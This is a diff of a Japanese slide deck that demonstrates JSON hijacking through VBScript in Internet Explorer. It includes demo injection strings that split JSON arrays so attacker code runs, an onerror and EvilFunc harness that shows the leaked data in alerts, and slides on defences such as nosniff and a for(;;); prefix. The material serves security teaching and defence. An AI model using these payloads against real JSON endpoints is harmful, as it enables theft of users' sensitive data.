@@ -16,7 +16,7 @@ http://imakewebthings.com/deck.js/introduction/#how-to-overview
 	<link rel="stylesheet" id="style-theme-link" href="deck/themes/style/web-2.0.css">
 	<title>JSON Hijacking using VBScript.</title>
 <style type="text/css">
-/* pre {font-family:monospace; color:#000; border : 1px solid #bbb;padding:1ex 1ex 1ex 1ex;}*/
+ /* pre {font-family:monospace; color:#000; border : 1px solid #bbb;padding:1ex 1ex 1ex 1ex;}*/
  pre {margin-top: 1ex;}
  code {color:darkred !important;}
  .r , code.r {color:red  !important;}
@@ -28,31 +28,60 @@ http://imakewebthings.com/deck.js/introduction/#how-to-overview
  .res {color:brown}
  .num {text-align:right}
  a:link {text-decoration: none;}
-/* #errs {margin-top:1ex; margin-left:2em;}*/
-th , td { border : 1px solid #555 !important; padding: 2px 2px 2px 2px}
+ /* #errs {margin-top:1ex; margin-left:2em;}*/
+ th , td { border : 1px solid #555 !important; padding: 2px 2px 2px 2px}
+ input {visibility : hidden}
 </style>
 <script type="text/javascript">
+var target;
+var vbsEnabled=false;
 var testStr;
-function EvilFunc() {
-	var s = '';
-	for (var i = 0; i < arguments.length; i++) {
-		s += '\n  ' + i + ' : ';
-		if (typeof arguments[i] === 'string') {
-			s += '"' + arguments[i] + '"';
-		} else {
-			s += arguments[i];
+function setupTest() {
+	window.onerror = function(e){
+		var s = "\n----------------------------------------------------------------------\n"
+		var m = ((/sensitive/.test(e))||(/4748923/.test(e))) ? "HIJACK SUCCEEDED!!" : "Hijack failed.";
+		var a="";
+		for (var i = 0; i < arguments.length; i++) {
+			a += '  ' + i + ' : ';
+			if (i == 1) {
+				a += ('"http://example.com/json?code=' + encodeURIComponent(testStr))+'"\n';
+			} else if (typeof arguments[i] === 'string') {
+				a += '"' + arguments[i] + '"\n';
+			} else {
+				a += arguments[i]+"\n";
+			}
 		}
-	}
-	var m = ((/sensitive/.test(e))||(/4748923/.test(e))) ? 'HIJACK SUCCEEDED!!' : 'Hijack failed.';
-	alert(m + '\n----------------------------------------\narguments:' + s);
+		alert(m + s + a + s + testStr + "\n");
+		try{document.activeElement.blur();}catch(e){}
+		return false;
+	};
+	window.EvilFunc = function() {
+		var s = '';
+		for (var i = 0; i < arguments.length; i++) {
+			s += '\n  ' + i + ' : ';
+			if (typeof arguments[i] === 'string') {
+				s += '"' + arguments[i] + '"';
+			} else {
+				s += arguments[i];
+			}
+		}
+		var m = /sensitive/.test(e) ? 'HIJACK SUCCEEDED!!' : 'Hijack failed.';
+		alert(m + '\n----------------------------------------\narguments:' + s);
+		try{document.activeElement.blur();}catch(e){}
+	};
+	$("input").css("visibility","visible");
 }
+
 </script>
 <script src="modernizr.custom.js"></script>
 
 <script type="text/vbscript">
+vbsEnabled=True
+
 Sub doTest(id)
-    testStr = trim(document.getElementById("test" & id).innerText)
-    ExecuteGlobal testStr
+	target="test" + CStr(id)
+	testStr = trim(document.getElementById(target).innerText)
+	ExecuteGlobal testStr
 End Sub
 Dim a3d(0,0,0)
 </script>
@@ -129,7 +158,6 @@ Dim a3d(0,0,0)
 </table>
 </section>
 <section class=slide>
-<h2>3.情報の漏洩するエラー</h2>
 <h3>3.2.数値のみ漏洩するエラー</h3>
 <table rules=all border=1>
 	<tr><th>No.</th><th>メッセージ</th><th>英語</th></tr>
@@ -192,7 +220,7 @@ Dim a3d(0,0,0)
 </pre>
 </section>
 <section class=slide>
-<h3>5.1.データ注入無しの情報漏えい</h2>
+<h3>5.1.データ注入無しの情報漏えい</h3>
 JSON配列全体が VBScriptで識別子と認識可能な場合、<code>Call</code>の省略された Call文扱いとなり、実行時エラー13が発生します。
 <pre id="test1">
     ["sensitive","data","is","here"]
@@ -213,7 +241,7 @@ JSON配列全体が VBScriptで識別子と認識可能な場合、<code>Call</c
 </section>
 <section class=slide>
 <h2>6.JSON配列を分割する</h2>
-<p>JSON配列に攻撃者が文字列を注入できる場所があり、<code class=r>]</code>をエスケープしていない場合、
+JSON配列に攻撃者が文字列を注入できる場所があり、<code class=r>]</code>をエスケープしていない場合、
 そこでJSON配列を分割することで攻撃が可能になります。
 </section>
 <section class=slide>
@@ -384,6 +412,7 @@ JSON配列全体が VBScriptで識別子と認識可能な場合、<code>Call</c
 <pre id="test41">["<span class="r">]=0:EvilFunc 0\"1</span>","sensitive-data","<span class="r">\"'</span>"]</pre>
     これは以下のように解釈されます。
 <pre><span class="p">["]</span>=0:EvilFunc 0\<span class="str">"1"</span>,<span class="str">"sensitive-data"</span>,<span class="str">"\"</span><span class="rem">'"]</span></pre>
+<p><input type="button" value="コード実行" onclick="doTest(41)"></p>
 </section>
 <section class=slide>
 これは以下の関数で秘密情報を奪取可能。
@@ -400,7 +429,6 @@ JSON配列全体が VBScriptで識別子と認識可能な場合、<code>Call</c
     <span class="res">var</span> m = (<span class="r">/sensitive/</span>.test(s)) ? <span class="s">'HIJACK SUCCEEDED!!'</span> : <span class="s">'Hijack failed.'</span>;
     alert(m + <span class="s">'\n----------------------------------------\narguments:'</span> + s);
 }</pre>
-<p><input type="button" value="コード実行" onclick="doTest(41)"></p>
 </section>
 <section class=slide>
 <h3>7.2.Err.Reise</h3>
@@ -412,18 +440,20 @@ Err.Raiseで強制的に実行時エラーを起こすことも可能
 </section>
 <section class=slide>
 <h2>8.JSONを守るには</h2>
-<p>JSON保護にはいくつかの方法がありますが、私は<b>VBScriptとして実行させない</b>という対策を強く勧めます
+<p>JSON保護にはいくつかの方法がありますが、私は<b>VBScriptとして実行させない</b>という対策を強く勧めます</p>
 <ol>
-    <li>VBScriptとしての実行を出来なくする</li>
+    <li>VBScriptとしての実行させない</li>
     <li>VBScript文法エラーのJSON(1:valid JSON)</li>
     <li>VBScript文法エラーのJSON(2:Invalid JSONの構文の枠外)</li>
-</ul>
+</ol>
 </section>
 <section class=slide>
 <h3>8.1.VBScriptとして実行させない</h3>
-<p>はせがわさんの日記読んでください。</p>
+<pre>X-Content-Type-Options:nosniff</pre>
+<p>詳細 は @hasegawayosuke さんの日記を読んでください。
+<a href="http://d.hatena.ne.jp/hasegawayosuke/20130517/p1">http://d.hatena.ne.jp/hasegawayosuke/20130517/p1</a></p>
 <br>
-<p>以下、そのような対策が出来ない場合の話です。</p>
+<p>以下は、そのような対策が出来ない場合の対策です。</p>
 </section>
 <section class=slide>
 <h3>8.2.VBScript構文エラー1</h3>
@@ -448,7 +478,7 @@ Err.Raiseで強制的に実行時エラーを起こすことも可能
 <h3>8.3.VBScript構文エラー2</h3>
 <h3>8.3.1.先頭に<code>for(;;);</code></h3>
 VBScriptのfor文はforの後に識別子が必要なので構文エラー 1010(Expected identifier)
-<pre id="test61">for<span class="r">(;;)</span>;["sensitive","data","is","here"]<
+<pre id="test61">for<span class="r">(;;)</span>;["sensitive","data","is","here"]</pre>
 <p><input type="button" value="コード実行" onclick="doTest(61)"></p>
 </section>
 <section class=slide>
@@ -465,7 +495,7 @@ whileの後の<code>";"</code> で構文エラー 1024(Expected statement)
 ["sensitive-data 1","<span class="r">]:Wend'</span>","sensitive-data-2"]</pre>
     これは以下のように解釈されます。
 <pre><span class="res">while</span>(1)
-<span class="p">["sensitive-data 1","]</span>:<span class="res">Wend</span><span class="rem">'","sensitive-data-2"]</span>
+<span class="p">["sensitive-data 1","]</span>:<span class="res">Wend</span><span class="rem">'","sensitive-data-2"]</span></pre>
 <p><input type="button" value="コード実行" onclick="doTest('62b')"></p>
 </section>
 <script type="text/javascript" src="jquery-1.7.min.js" charset="UTF-8"></script>
@@ -478,25 +508,9 @@ whileの後の<code>";"</code> で構文エラー 1024(Expected statement)
 <script type="text/javascript">
 $(function() {
 	$.deck('.slide');
+	if (vbsEnabled) setupTest();
 });
 
-window.onerror = function(e){
-	var s = "\n----------------------------------------------------------------------\n"
-	var m = ((/sensitive/.test(e))||(/4748923/.test(e))) ? "HIJACK SUCCEEDED!!" : "Hijack failed.";
-	var a="";
-	for (var i = 0; i < arguments.length; i++) {
-		a += '  ' + i + ' : ';
-		if (i == 1) {
-			a += ('"http://example.com/json?code=' + encodeURIComponent(testStr))+'"\n';
-		} else if (typeof arguments[i] === 'string') {
-			a += '"' + arguments[i] + '"\n';
-		} else {
-			a += arguments[i]+"\n";
-		}
-	}
-	alert(m + s + a + s + testStr + "\n");
-	return false;
-};
 </script>
 </body>
 </html>
